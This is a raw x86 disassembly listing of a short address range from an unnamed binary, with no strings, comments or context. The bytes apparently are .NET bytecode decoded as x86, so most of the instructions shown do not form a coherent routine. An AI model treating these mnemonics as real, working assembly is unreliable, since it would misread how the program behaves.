  404220:	00 00                	add    %al,(%eax)
  404222:	06                   	push   %es
  404223:	02 28                	add    (%eax),%ch
  404225:	42                   	inc    %edx
  404226:	00 00                	add    %al,(%eax)
  404228:	0a 28                	or     (%eax),%ch
  40422a:	88 00                	mov    %al,(%eax)
  40422c:	00 0a                	add    %cl,(%edx)
  40422e:	0a 06                	or     (%esi),%al
  404230:	28 21                	sub    %ah,(%ecx)
  404232:	00 00                	add    %al,(%eax)
  404234:	0a 03                	or     (%ebx),%al
  404236:	28 c8                	sub    %cl,%al
  404238:	00 00                	add    %al,(%eax)
  40423a:	0a 20                	or     (%eax),%ah
  40423c:	f4                   	hlt
  40423d:	01 00                	add    %eax,(%eax)
  40423f:	00 28                	add    %ch,(%eax)
  404241:	20 00                	and    %al,(%eax)
  404243:	00 0a                	add    %cl,(%edx)
  404245:	02 6f bd             	add    -0x43(%edi),%ch
  404248:	00 00                	add    %al,(%eax)
  40424a:	0a 72 a5             	or     -0x5b(%edx),%dh
  40424d:	07                   	pop    %es
  40424e:	00 70 6f             	add    %dh,0x6f(%eax)
  404251:	c9                   	leave
  404252:	00 00                	add    %al,(%eax)
  404254:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  404257:	72 af                	jb     0x404208
  404259:	07                   	pop    %es
  40425a:	00 70 73             	add    %dh,0x73(%eax)
  40425d:	ca 00 00             	lret   $0x0
  404260:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404263:	17                   	pop    %ss
  404264:	6f                   	outsl  %ds:(%esi),(%dx)
  404265:	cb                   	lret
  404266:	00 00                	add    %al,(%eax)
  404268:	0a 08                	or     (%eax),%cl
  40426a:	72 cd                	jb     0x404239
  40426c:	07                   	pop    %es
  40426d:	00 70 06             	add    %dh,0x6(%eax)
  404270:	28 60 00             	sub    %ah,0x0(%eax)
  404273:	00 0a                	add    %cl,(%edx)
  404275:	72 0d                	jb     0x404284
  404277:	08 00                	or     %al,(%eax)
  404279:	70 28                	jo     0x4042a3
  40427b:	60                   	pusha
  40427c:	00 00                	add    %al,(%eax)
  40427e:	0a 28                	or     (%eax),%ch
  404280:	21 00                	and    %eax,(%eax)
  404282:	00 0a                	add    %cl,(%edx)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	cc                   	int3
  404286:	00 00                	add    %al,(%eax)
  404288:	0a 08                	or     (%eax),%cl
  40428a:	28 cd                	sub    %cl,%ch
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 0b                	or     (%ebx),%cl
  404290:	2b 4d 14             	sub    0x14(%ebp),%ecx
  404293:	d0 60 00             	shlb   $1,0x0(%eax)
  404296:	00 01                	add    %al,(%ecx)
  404298:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40429b:	00 0a                	add    %cl,(%edx)
  40429d:	72 8f                	jb     0x40422e
  40429f:	03 00                	add    (%eax),%eax
  4042a1:	70 17                	jo     0x4042ba
  4042a3:	8d 03                	lea    (%ebx),%eax
  4042a5:	00 00                	add    %al,(%eax)
  4042a7:	01 0d 09 16 06 28    	add    %ecx,0x28061609
  4042ad:	11 00                	adc    %eax,(%eax)
  4042af:	00 0a                	add    %cl,(%edx)
  4042b1:	a2 09 13 04 11       	mov    %al,0x11041309
  4042b6:	04 14                	add    $0x14,%al
  4042b8:	14 17                	adc    $0x17,%al
  4042ba:	8d 38                	lea    (%eax),%edi
  4042bc:	00 00                	add    %al,(%eax)
  4042be:	01 13                	add    %edx,(%ebx)
  4042c0:	05 11 05 16 17       	add    $0x17160511,%eax
  4042c5:	9c                   	pushf
  4042c6:	11 05 17 28 72 00    	adc    %eax,0x722817
  4042cc:	00 0a                	add    %cl,(%edx)
  4042ce:	26 11 05 16 90 2c 0a 	adc    %eax,%es:0xa2c9016
  4042d5:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4042d8:	9a 28 11 00 00 0a 0a 	lcall  $0xa0a,$0x1128
  4042df:	2a 1b                	sub    (%ebx),%bl
  4042e1:	30 03                	xor    %al,(%ebx)
  4042e3:	00 5d 00             	add    %bl,0x0(%ebp)
  4042e6:	00 00                	add    %al,(%eax)
  4042e8:	26 00 00             	add    %al,%es:(%eax)
  4042eb:	11 28                	adc    %ebp,(%eax)
  4042ed:	a8 00                	test   $0x0,%al
  4042ef:	00 0a                	add    %cl,(%edx)
  4042f1:	02 6f a9             	add    -0x57(%edi),%ch
  4042f4:	00 00                	add    %al,(%eax)
  4042f6:	0a 0b                	or     (%ebx),%cl
  4042f8:	07                   	pop    %es
  4042f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042fa:	ce                   	into
  4042fb:	00 00                	add    %al,(%eax)
  4042fd:	0a 0d 07 09 6f ab    	or     0xab6f0907,%cl
  404303:	00 00                	add    %al,(%eax)
  404305:	0a 6f cf             	or     -0x31(%edi),%ch
  404308:	00 00                	add    %al,(%eax)
  40430a:	0a 28                	or     (%eax),%ch
  40430c:	11 00                	adc    %eax,(%eax)
  40430e:	00 0a                	add    %cl,(%edx)
  404310:	0c 17                	or     $0x17,%al
  404312:	8d 03                	lea    (%ebx),%eax
  404314:	00 00                	add    %al,(%eax)
  404316:	01 13                	add    %edx,(%ebx)
  404318:	04 09                	add    $0x9,%al
  40431a:	6f                   	outsl  %ds:(%esi),(%dx)
  40431b:	d0 00                	rolb   $1,(%eax)
  40431d:	00 0a                	add    %cl,(%edx)
  40431f:	8e b7 16 33 03 14    	mov    0x14033316(%edi),%?
  404325:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  404328:	08 28                	or     %ch,(%eax)
  40432a:	11 00                	adc    %eax,(%eax)
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404331:	d1 00                	roll   $1,(%eax)
  404333:	00 0a                	add    %cl,(%edx)
  404335:	26 de 0f             	fimuls %es:(%edi)
  404338:	25 28 22 00 00       	and    $0x2228,%eax
  40433d:	0a 13                	or     (%ebx),%dl
  40433f:	05 28 24 00 00       	add    $0x2428,%eax
  404344:	0a de                	or     %dh,%bl
  404346:	00 06                	add    %al,(%esi)
  404348:	2a 00                	sub    (%eax),%al
  40434a:	00 00                	add    %al,(%eax)
  40434c:	01 10                	add    %edx,(%eax)
  40434e:	00 00                	add    %al,(%eax)
  404350:	00 00                	add    %al,(%eax)
  404352:	00 00                	add    %al,(%eax)
  404354:	4c                   	dec    %esp
  404355:	4c                   	dec    %esp
  404356:	00 0f                	add    %cl,(%edi)
  404358:	25 00 00 01 3a       	and    $0x3a010000,%eax
  40435d:	02 28                	add    (%eax),%ch
  40435f:	21 00                	and    %eax,(%eax)
  404361:	00 0a                	add    %cl,(%edx)
  404363:	28 31                	sub    %dh,(%ecx)
  404365:	00 00                	add    %al,(%eax)
  404367:	06                   	push   %es
  404368:	2b 00                	sub    (%eax),%eax
  40436a:	2a 00                	sub    (%eax),%al
  40436c:	3a 02                	cmp    (%edx),%al
  40436e:	28 21                	sub    %ah,(%ecx)
  404370:	00 00                	add    %al,(%eax)
  404372:	0a 28                	or     (%eax),%ch
  404374:	32 00                	xor    (%eax),%al
  404376:	00 06                	add    %al,(%esi)
  404378:	2b 00                	sub    (%eax),%eax
  40437a:	2a 00                	sub    (%eax),%al
  40437c:	1b 30                	sbb    (%eax),%esi
  40437e:	05 00 aa 00 00       	add    $0xaa00,%eax
  404383:	00 27                	add    %ah,(%edi)
  404385:	00 00                	add    %al,(%eax)
  404387:	11 18                	adc    %ebx,(%eax)
  404389:	17                   	pop    %ss
  40438a:	1c 73                	sbb    $0x73,%al
  40438c:	32 00                	xor    (%eax),%al
  40438e:	00 0a                	add    %cl,(%edx)
  404390:	0c 08                	or     $0x8,%al
  404392:	02 7b 31             	add    0x31(%ebx),%bh
  404395:	00 00                	add    %al,(%eax)
  404397:	04 02                	add    $0x2,%al
  404399:	7b 32                	jnp    0x4043cd
  40439b:	00 00                	add    %al,(%eax)
  40439d:	04 28                	add    $0x28,%al
  40439f:	af                   	scas   %es:(%edi),%eax
  4043a0:	00 00                	add    %al,(%eax)
  4043a2:	0a 6f 36             	or     0x36(%edi),%ch
  4043a5:	00 00                	add    %al,(%eax)
  4043a7:	0a 1b                	or     (%ebx),%bl
  4043a9:	8d 2d 00 00 01 13    	lea    0x13010000,%ebp
  4043af:	04 11                	add    $0x11,%al
  4043b1:	04 16                	add    $0x16,%al
  4043b3:	72 11                	jb     0x4043c6
  4043b5:	08 00                	or     %al,(%eax)
  4043b7:	70 a2                	jo     0x40435b
  4043b9:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4043bc:	02 7b 31             	add    0x31(%ebx),%bh
  4043bf:	00 00                	add    %al,(%eax)
  4043c1:	04 a2                	add    $0xa2,%al
  4043c3:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  4043c6:	72 41                	jb     0x404409
  4043c8:	08 00                	or     %al,(%eax)
  4043ca:	70 a2                	jo     0x40436e
  4043cc:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  4043cf:	7e 29                	jle    0x4043fa
  4043d1:	00 00                	add    %al,(%eax)
  4043d3:	04 73                	add    $0x73,%al
  4043d5:	29 00                	sub    %eax,(%eax)
  4043d7:	00 0a                	add    %cl,(%edx)
  4043d9:	7e 29                	jle    0x404404
  4043db:	00 00                	add    %al,(%eax)
  4043dd:	04 8e                	add    $0x8e,%al
  4043df:	b7 6f                	mov    $0x6f,%bh
  4043e1:	2f                   	das
  4043e2:	00 00                	add    %al,(%eax)
  4043e4:	0a 9a a2 11 04 1a    	or     0x1a0411a2(%edx),%bl
  4043ea:	72 f2                	jb     0x4043de
  4043ec:	08 00                	or     %al,(%eax)
  4043ee:	70 a2                	jo     0x404392
  4043f0:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4043f3:	7f 00                	jg     0x4043f5
  4043f5:	00 0a                	add    %cl,(%edx)
  4043f7:	0b 28                	or     (%eax),%ebp
  4043f9:	d2 00                	rolb   %cl,(%eax)
  4043fb:	00 0a                	add    %cl,(%edx)
  4043fd:	07                   	pop    %es
  4043fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ff:	d3 00                	roll   %cl,(%eax)
  404401:	00 0a                	add    %cl,(%edx)
  404403:	0a 08                	or     (%eax),%cl
  404405:	06                   	push   %es
  404406:	16                   	push   %ss
  404407:	06                   	push   %es
  404408:	8e b7 16 6f d4 00    	mov    0xd46f16(%edi),%?
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	26 20 c4             	es and %al,%ah
  404413:	09 00                	or     %eax,(%eax)
  404415:	00 28                	add    %ch,(%eax)
  404417:	20 00                	and    %al,(%eax)
  404419:	00 0a                	add    %cl,(%edx)
  40441b:	08 6f 7d             	or     %ch,0x7d(%edi)
  40441e:	00 00                	add    %al,(%eax)
  404420:	0a de                	or     %dh,%bl
  404422:	0e                   	push   %cs
  404423:	25 28 22 00 00       	and    $0x2228,%eax
  404428:	0a 0d 28 24 00 00    	or     0x2428,%cl
  40442e:	0a de                	or     %dh,%bl
  404430:	00 2a                	add    %ch,(%edx)
  404432:	00 00                	add    %al,(%eax)
  404434:	01 10                	add    %edx,(%eax)
  404436:	00 00                	add    %al,(%eax)
  404438:	00 00                	add    %al,(%eax)
  40443a:	00 00                	add    %al,(%eax)
  40443c:	9b                   	fwait
  40443d:	9b                   	fwait
  40443e:	00 0e                	add    %cl,(%esi)
  404440:	25 00 00 01 1e       	and    $0x1e010000,%eax
  404445:	02 28                	add    (%eax),%ch
  404447:	17                   	pop    %ss
  404448:	00 00                	add    %al,(%eax)
  40444a:	0a 2a                	or     (%edx),%ch
  40444c:	1e                   	push   %ds
  40444d:	02 28                	add    (%eax),%ch
  40444f:	17                   	pop    %ss
  404450:	00 00                	add    %al,(%eax)
  404452:	0a 2a                	or     (%edx),%ch
  404454:	1b 30                	sbb    (%eax),%esi
  404456:	04 00                	add    $0x0,%al
  404458:	35 01 00 00 28       	xor    $0x28000001,%eax
  40445d:	00 00                	add    %al,(%eax)
  40445f:	11 02                	adc    %eax,(%edx)
  404461:	2c 2f                	sub    $0x2f,%al
  404463:	28 87 00 00 0a 1c    	sub    %al,0x1c0a0000(%edi)
  404469:	28 42 00             	sub    %al,0x0(%edx)
  40446c:	00 06                	add    %al,(%esi)
  40446e:	03 28                	add    (%eax),%ebp
  404470:	42                   	inc    %edx
  404471:	00 00                	add    %al,(%eax)
  404473:	0a 28                	or     (%eax),%ch
  404475:	88 00                	mov    %al,(%eax)
  404477:	00 0a                	add    %cl,(%edx)
  404479:	10 01                	adc    %al,(%ecx)
  40447b:	03 04 28             	add    (%eax,%ebp,1),%eax
  40447e:	c8 00 00 0a          	enter  $0x0,$0xa
  404482:	de 0e                	fimuls (%esi)
  404484:	25 28 22 00 00       	and    $0x2228,%eax
  404489:	0a 0a                	or     (%edx),%cl
  40448b:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40448e:	00 0a                	add    %cl,(%edx)
  404490:	de 00                	fiadds (%eax)
  404492:	28 d7                	sub    %dl,%bh
  404494:	00 00                	add    %al,(%eax)
  404496:	0a 72 28             	or     0x28(%edx),%dh
  404499:	09 00                	or     %eax,(%eax)
  40449b:	70 28                	jo     0x4044c5
  40449d:	42                   	inc    %edx
  40449e:	00 00                	add    %al,(%eax)
  4044a0:	0a 0b                	or     (%ebx),%cl
  4044a2:	07                   	pop    %es
  4044a3:	73 d8                	jae    0x40447d
  4044a5:	00 00                	add    %al,(%eax)
  4044a7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4044aa:	72 32                	jb     0x4044de
  4044ac:	09 00                	or     %eax,(%eax)
  4044ae:	70 6f                	jo     0x40451f
  4044b0:	d9 00                	flds   (%eax)
  4044b2:	00 0a                	add    %cl,(%edx)
  4044b4:	08 72 46             	or     %dh,0x46(%edx)
  4044b7:	09 00                	or     %eax,(%eax)
  4044b9:	70 6f                	jo     0x40452a
  4044bb:	d9 00                	flds   (%eax)
  4044bd:	00 0a                	add    %cl,(%edx)
  4044bf:	08 72 66             	or     %dh,0x66(%edx)
  4044c2:	09 00                	or     %eax,(%eax)
  4044c4:	70 28                	jo     0x4044ee
  4044c6:	da 00                	fiaddl (%eax)
  4044c8:	00 0a                	add    %cl,(%edx)
  4044ca:	28 42 00             	sub    %al,0x0(%edx)
  4044cd:	00 0a                	add    %cl,(%edx)
  4044cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d0:	d9 00                	flds   (%eax)
  4044d2:	00 0a                	add    %cl,(%edx)
  4044d4:	08 72 6e             	or     %dh,0x6e(%edx)
  4044d7:	09 00                	or     %eax,(%eax)
  4044d9:	70 28                	jo     0x404503
  4044db:	db 00                	fildl  (%eax)
  4044dd:	00 0a                	add    %cl,(%edx)
  4044df:	28 49 00             	sub    %cl,0x0(%ecx)
  4044e2:	00 0a                	add    %cl,(%edx)
  4044e4:	72 7a                	jb     0x404560
  4044e6:	09 00                	or     %eax,(%eax)
  4044e8:	70 28                	jo     0x404512
  4044ea:	4f                   	dec    %edi
  4044eb:	00 00                	add    %al,(%eax)
  4044ed:	0a 6f d9             	or     -0x27(%edi),%ch
  4044f0:	00 00                	add    %al,(%eax)
  4044f2:	0a 08                	or     (%eax),%cl
  4044f4:	72 66                	jb     0x40455c
  4044f6:	09 00                	or     %eax,(%eax)
  4044f8:	70 28                	jo     0x404522
  4044fa:	87 00                	xchg   %eax,(%eax)
  4044fc:	00 0a                	add    %cl,(%edx)
  4044fe:	28 42 00             	sub    %al,0x0(%edx)
  404501:	00 0a                	add    %cl,(%edx)
  404503:	6f                   	outsl  %ds:(%esi),(%dx)
  404504:	d9 00                	flds   (%eax)
  404506:	00 0a                	add    %cl,(%edx)
  404508:	08 72 6e             	or     %dh,0x6e(%edx)
  40450b:	09 00                	or     %eax,(%eax)
  40450d:	70 07                	jo     0x404516
  40450f:	28 49 00             	sub    %cl,0x0(%ecx)
  404512:	00 0a                	add    %cl,(%edx)
  404514:	72 7a                	jb     0x404590
  404516:	09 00                	or     %eax,(%eax)
  404518:	70 28                	jo     0x404542
  40451a:	4f                   	dec    %edi
  40451b:	00 00                	add    %al,(%eax)
  40451d:	0a 6f d9             	or     -0x27(%edi),%ch
  404520:	00 00                	add    %al,(%eax)
  404522:	0a de                	or     %dh,%bl
  404524:	0a 08                	or     (%eax),%cl
  404526:	2c 06                	sub    $0x6,%al
  404528:	08 6f 58             	or     %ch,0x58(%edi)
  40452b:	00 00                	add    %al,(%eax)
  40452d:	0a dc                	or     %ah,%bl
  40452f:	02 2c 15 03 28 8b 00 	add    0x8b2803(,%edx,1),%ch
  404536:	00 0a                	add    %cl,(%edx)
  404538:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  40453c:	22 00                	and    (%eax),%al
  40453e:	00 0a                	add    %cl,(%edx)
  404540:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404543:	00 0a                	add    %cl,(%edx)
  404545:	de 00                	fiadds (%eax)
  404547:	73 dc                	jae    0x404525
  404549:	00 00                	add    %al,(%eax)
  40454b:	0a 13                	or     (%ebx),%dl
  40454d:	04 11                	add    $0x11,%al
  40454f:	04 07                	add    $0x7,%al
  404551:	6f                   	outsl  %ds:(%esi),(%dx)
  404552:	dd 00                	fldl   (%eax)
  404554:	00 0a                	add    %cl,(%edx)
  404556:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404559:	6f                   	outsl  %ds:(%esi),(%dx)
  40455a:	de 00                	fiadds (%eax)
  40455c:	00 0a                	add    %cl,(%edx)
  40455e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404561:	6f                   	outsl  %ds:(%esi),(%dx)
  404562:	df 00                	filds  (%eax)
  404564:	00 0a                	add    %cl,(%edx)
  404566:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404569:	6f                   	outsl  %ds:(%esi),(%dx)
  40456a:	e0 00                	loopne 0x40456c
  40456c:	00 0a                	add    %cl,(%edx)
  40456e:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404571:	6f                   	outsl  %ds:(%esi),(%dx)
  404572:	cb                   	lret
  404573:	00 00                	add    %al,(%eax)
  404575:	0a 11                	or     (%ecx),%dl
  404577:	04 28                	add    $0x28,%al
  404579:	cd 00                	int    $0x0
  40457b:	00 0a                	add    %cl,(%edx)
  40457d:	26 16                	es push %ss
  40457f:	28 23                	sub    %ah,(%ebx)
  404581:	00 00                	add    %al,(%eax)
  404583:	0a de                	or     %dh,%bl
  404585:	0e                   	push   %cs
  404586:	25 28 22 00 00       	and    $0x2228,%eax
  40458b:	0a 0d 28 24 00 00    	or     0x2428,%cl
  404591:	0a de                	or     %dh,%bl
  404593:	00 2a                	add    %ch,(%edx)
  404595:	00 00                	add    %al,(%eax)
  404597:	00 01                	add    %al,(%ecx)
  404599:	34 00                	xor    $0x0,%al
  40459b:	00 00                	add    %al,(%eax)
  40459d:	00 03                	add    %al,(%ebx)
  40459f:	00 21                	add    %ah,(%ecx)
  4045a1:	24 00                	and    $0x0,%al
  4045a3:	0e                   	push   %cs
  4045a4:	25 00 00 01 02       	and    $0x2010000,%eax
  4045a9:	00 49 00             	add    %cl,0x0(%ecx)
  4045ac:	7c c5                	jl     0x404573
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	00 00                	add    %al,(%eax)
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	00 00                	add    %al,(%eax)
  4045b6:	d2 00                	rolb   %cl,(%eax)
  4045b8:	09 db                	or     %ebx,%ebx
  4045ba:	00 0c 25 00 00 01 00 	add    %cl,0x10000(,%eiz,1)
  4045c1:	00 32                	add    %dh,(%edx)
  4045c3:	00 f4                	add    %dh,%ah
  4045c5:	26 01 0e             	add    %ecx,%es:(%esi)
  4045c8:	25 00 00 01 1e       	and    $0x1e010000,%eax
  4045cd:	02 28                	add    (%eax),%ch
  4045cf:	17                   	pop    %ss
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 2a                	or     (%edx),%ch
  4045d4:	13 30                	adc    (%eax),%esi
  4045d6:	05 00 80 00 00       	add    $0x8000,%eax
  4045db:	00 29                	add    %ch,(%ecx)
  4045dd:	00 00                	add    %al,(%eax)
  4045df:	11 73 e1             	adc    %esi,-0x1f(%ebx)
  4045e2:	00 00                	add    %al,(%eax)
  4045e4:	0a 0a                	or     (%edx),%cl
  4045e6:	73 e2                	jae    0x4045ca
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	0a 13                	or     (%ebx),%dl
  4045ec:	06                   	push   %es
  4045ed:	72 63                	jb     0x404652
  4045ef:	03 00                	add    (%eax),%eax
  4045f1:	70 0d                	jo     0x404600
  4045f3:	1f                   	pop    %ds
  4045f4:	20 8d 33 00 00 01    	and    %cl,0x1000033(%ebp)
  4045fa:	13 05 11 06 7e 0e    	adc    0xe7e0611,%eax
  404600:	00 00                	add    %al,(%eax)
  404602:	04 28                	add    $0x28,%al
  404604:	4b                   	dec    %ebx
  404605:	00 00                	add    %al,(%eax)
  404607:	06                   	push   %es
  404608:	6f                   	outsl  %ds:(%esi),(%dx)
  404609:	e3 00                	jecxz  0x40460b
  40460b:	00 0a                	add    %cl,(%edx)
  40460d:	13 07                	adc    (%edi),%eax
  40460f:	11 07                	adc    %eax,(%edi)
  404611:	16                   	push   %ss
  404612:	11 05 16 1f 10 28    	adc    %eax,0x28101f16
  404618:	e4 00                	in     $0x0,%al
  40461a:	00 0a                	add    %cl,(%edx)
  40461c:	11 07                	adc    %eax,(%edi)
  40461e:	16                   	push   %ss
  40461f:	11 05 1f 0f 1f 10    	adc    %eax,0x101f0f1f
  404625:	28 e4                	sub    %ah,%ah
  404627:	00 00                	add    %al,(%eax)
  404629:	0a 06                	or     (%esi),%al
  40462b:	11 05 6f e5 00 00    	adc    %eax,0xe56f
  404631:	0a 06                	or     (%esi),%al
  404633:	18 6f e6             	sbb    %ch,-0x1a(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 06                	or     (%esi),%al
  40463a:	6f                   	outsl  %ds:(%esi),(%dx)
  40463b:	e7 00                	out    %eax,$0x0
  40463d:	00 0a                	add    %cl,(%edx)
  40463f:	13 04 02             	adc    (%edx,%eax,1),%eax
  404642:	28 83 00 00 0a 0b    	sub    %al,0xb0a0000(%ebx)
  404648:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40464b:	16                   	push   %ss
  40464c:	07                   	pop    %es
  40464d:	8e b7 6f e8 00 00    	mov    0xe86f(%edi),%?
  404653:	0a 28                	or     (%eax),%ch
  404655:	4c                   	dec    %esp
  404656:	00 00                	add    %al,(%eax)
  404658:	06                   	push   %es
  404659:	0d 09 0c 2b 00       	or     $0x2b0c09,%eax
  40465e:	08 2a                	or     %ch,(%edx)
  404660:	13 30                	adc    (%eax),%esi
  404662:	03 00                	add    (%eax),%eax
  404664:	75 00                	jne    0x404666
  404666:	00 00                	add    %al,(%eax)
  404668:	2a 00                	sub    (%eax),%al
  40466a:	00 11                	add    %dl,(%ecx)
  40466c:	16                   	push   %ss
  40466d:	80 1f 00             	sbbb   $0x0,(%edi)
  404670:	00 04 73             	add    %al,(%ebx,%esi,2)
  404673:	29 00                	sub    %eax,(%eax)
  404675:	00 0a                	add    %cl,(%edx)
  404677:	80 21 00             	andb   $0x0,(%ecx)
  40467a:	00 04 72             	add    %al,(%edx,%esi,2)
  40467d:	8a 09                	mov    (%ecx),%cl
  40467f:	00 70 28             	add    %dh,0x28(%eax)
  404682:	4d                   	dec    %ebp
  404683:	00 00                	add    %al,(%eax)
  404685:	06                   	push   %es
  404686:	28 42 00             	sub    %al,0x0(%edx)
  404689:	00 0a                	add    %cl,(%edx)
  40468b:	80 22 00             	andb   $0x0,(%edx)
  40468e:	00 04 28             	add    %al,(%eax,%ebp,1)
  404691:	e9 00 00 0a 6f       	jmp    0x6f4a4696
  404696:	ea 00 00 0a 6f eb 00 	ljmp   $0xeb,$0x6f0a0000
  40469d:	00 0a                	add    %cl,(%edx)
  40469f:	80 23 00             	andb   $0x0,(%ebx)
  4046a2:	00 04 7f             	add    %al,(%edi,%edi,2)
  4046a5:	25 00 00 04 fe       	and    $0xfe040000,%eax
  4046aa:	15 0e 00 00 02       	adc    $0x200000e,%eax
  4046af:	7f 26                	jg     0x4046d7
  4046b1:	00 00                	add    %al,(%eax)
  4046b3:	04 16                	add    $0x16,%al
  4046b5:	6a 28                	push   $0x28
  4046b7:	ec                   	in     (%dx),%al
  4046b8:	00 00                	add    %al,(%eax)
  4046ba:	0a 19                	or     (%ecx),%bl
  4046bc:	8d 2d 00 00 01 0a    	lea    0xa010000,%ebp
  4046c2:	06                   	push   %es
  4046c3:	16                   	push   %ss
  4046c4:	72 9e                	jb     0x404664
  4046c6:	09 00                	or     %eax,(%eax)
  4046c8:	70 a2                	jo     0x40466c
  4046ca:	06                   	push   %es
  4046cb:	17                   	pop    %ss
  4046cc:	72 3b                	jb     0x404709
  4046ce:	0a 00                	or     (%eax),%al
  4046d0:	70 a2                	jo     0x404674
  4046d2:	06                   	push   %es
  4046d3:	18 72 50             	sbb    %dh,0x50(%edx)
  4046d6:	0b 00                	or     (%eax),%eax
  4046d8:	70 a2                	jo     0x40467c
  4046da:	06                   	push   %es
  4046db:	80 29 00             	subb   $0x0,(%ecx)
  4046de:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	00 13                	add    %dl,(%ebx)
  4046e5:	30 02                	xor    %al,(%edx)
  4046e7:	00 11                	add    %dl,(%ecx)
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	00 2b                	add    %ch,(%ebx)
  4046ed:	00 00                	add    %al,(%eax)
  4046ef:	11 02                	adc    %eax,(%edx)
  4046f1:	28 ed                	sub    %ch,%ch
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 16                	or     (%esi),%dl
  4046f7:	fe 01                	incb   (%ecx)
  4046f9:	16                   	push   %ss
  4046fa:	fe 01                	incb   (%ecx)
  4046fc:	0a 2b                	or     (%ebx),%ch
  4046fe:	00 06                	add    %al,(%esi)
  404700:	2a 00                	sub    (%eax),%al
  404702:	00 00                	add    %al,(%eax)
  404704:	13 30                	adc    (%eax),%esi
  404706:	04 00                	add    $0x0,%al
  404708:	47                   	inc    %edi
  404709:	00 00                	add    %al,(%eax)
  40470b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40470e:	00 11                	add    %dl,(%ecx)
  404710:	02 73 ee             	add    -0x12(%ebx),%dh
  404713:	00 00                	add    %al,(%eax)
  404715:	0a 0b                	or     (%ebx),%cl
  404717:	16                   	push   %ss
  404718:	02 17                	add    (%edi),%dl
  40471a:	da 0d 0c 2b 29 07    	fimull 0x7292b0c
  404720:	72 39                	jb     0x40475b
  404722:	0c 00                	or     $0x0,%al
  404724:	70 7e                	jo     0x4047a4
  404726:	21 00                	and    %eax,(%eax)
  404728:	00 04 72             	add    %al,(%edx,%esi,2)
  40472b:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  40472e:	70 6f                	jo     0x40479f
  404730:	5a                   	pop    %edx
  404731:	00 00                	add    %al,(%eax)
  404733:	0a 6f 2f             	or     0x2f(%edi),%ch
  404736:	00 00                	add    %al,(%eax)
  404738:	0a 6f ef             	or     -0x11(%edi),%ch
  40473b:	00 00                	add    %al,(%eax)
  40473d:	0a 6f f0             	or     -0x10(%edi),%ch
  404740:	00 00                	add    %al,(%eax)
  404742:	0a 26                	or     (%esi),%ah
  404744:	08 17                	or     %dl,(%edi)
  404746:	d6                   	salc
  404747:	0c 08                	or     $0x8,%al
  404749:	09 31                	or     %esi,(%ecx)
  40474b:	d3 07                	roll   %cl,(%edi)
  40474d:	6f                   	outsl  %ds:(%esi),(%dx)
  40474e:	59                   	pop    %ecx
  40474f:	00 00                	add    %al,(%eax)
  404751:	0a 0a                	or     (%edx),%cl
  404753:	2b 00                	sub    (%eax),%eax
  404755:	06                   	push   %es
  404756:	2a 00                	sub    (%eax),%al
  404758:	13 30                	adc    (%eax),%esi
  40475a:	02 00                	add    (%eax),%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	00 00                	add    %al,(%eax)
  40475f:	00 2d 00 00 11 16    	add    %ch,0x16110000
  404765:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  404769:	04 7f                	add    $0x7f,%al
  40476b:	25 00 00 04 7e       	and    $0x7e040000,%eax
  404770:	25 00 00 04 28       	and    $0x28040000,%eax
  404775:	04 00                	add    $0x0,%al
  404777:	00 2b                	add    %ch,(%ebx)
  404779:	7d 2b                	jge    0x4047a6
  40477b:	00 00                	add    %al,(%eax)
  40477d:	04 7f                	add    $0x7f,%al
  40477f:	25 00 00 04 16       	and    $0x16040000,%eax
  404784:	7d 2c                	jge    0x4047b2
  404786:	00 00                	add    %al,(%eax)
  404788:	04 7f                	add    $0x7f,%al
  40478a:	25 00 00 04 28       	and    $0x28040000,%eax
  40478f:	43                   	inc    %ebx
  404790:	00 00                	add    %al,(%eax)
  404792:	06                   	push   %es
  404793:	2c 15                	sub    $0x15,%al
  404795:	28 f2                	sub    %dh,%dl
  404797:	00 00                	add    %al,(%eax)
  404799:	0a 7f 25             	or     0x25(%edi),%bh
  40479c:	00 00                	add    %al,(%eax)
  40479e:	04 7b                	add    $0x7b,%al
  4047a0:	2c 00                	sub    $0x0,%al
  4047a2:	00 04 da             	add    %al,(%edx,%ebx,8)
  4047a5:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  4047a9:	04 7e                	add    $0x7e,%al
  4047ab:	24 00                	and    $0x0,%al
  4047ad:	00 04 16             	add    %al,(%esi,%edx,1)
  4047b0:	31 1b                	xor    %ebx,(%ebx)
  4047b2:	7e 24                	jle    0x4047d8
  4047b4:	00 00                	add    %al,(%eax)
